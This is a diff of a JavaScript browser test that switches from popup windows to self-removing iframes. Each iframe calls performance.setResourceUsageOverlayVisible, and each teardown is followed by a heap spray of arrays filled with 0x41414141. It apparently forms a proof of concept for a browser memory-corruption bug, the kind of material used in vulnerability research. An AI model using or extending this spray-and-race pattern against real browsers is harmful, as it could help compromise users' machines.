@@ -7,25 +7,25 @@
             console.log("Starting test...");
             for (let i = 0; i < 10; i++) {
                 try {
-                    let win = window.open("", "_blank");
-                    if (win) {
-                        win.document.write(`
-                            <script>
-                                try {
-                                    window.performance = window.performance || {};
-                                    performance.setResourceUsageOverlayVisible = performance.setResourceUsageOverlayVisible || function(visible) {
-                                        console.log("Tried to set overlay visible: " + visible);
-                                    };
-                                    performance.setResourceUsageOverlayVisible(true);
-                                } catch (e) {
-                                    console.log("Error in window:", e);
-                                }
-                            </script>
-                                         `);
-                        win.document.close();
-                        await new Promise(resolve => setTimeout(resolve, 300));
-                        win.close();
-                    }
+                    let frame = document.createElement("iframe");
+                    frame.srcdoc = `
+                        <script>
+                            try {
+                                window.performance = window.performance || {};
+                                performance.setResourceUsageOverlayVisible = performance.setResourceUsageOverlayVisible || function(visible) {
+                                    console.log("Tried to set overlay visible: " + visible);
+                                };
+                                performance.setResourceUsageOverlayVisible(true);
+                                setTimeout(() => parent.document.getElementById("frame").remove(), 100);
+                            } catch (e) {
+                                parent.console.log("Error in iframe:", e);
+                            }
+                        </script>
+                    `;
+                    frame.id = "frame";
+                    document.body.appendChild(frame);
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    frame.remove();
                     spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                 } catch (e) {
                     console.log("Error:", e);
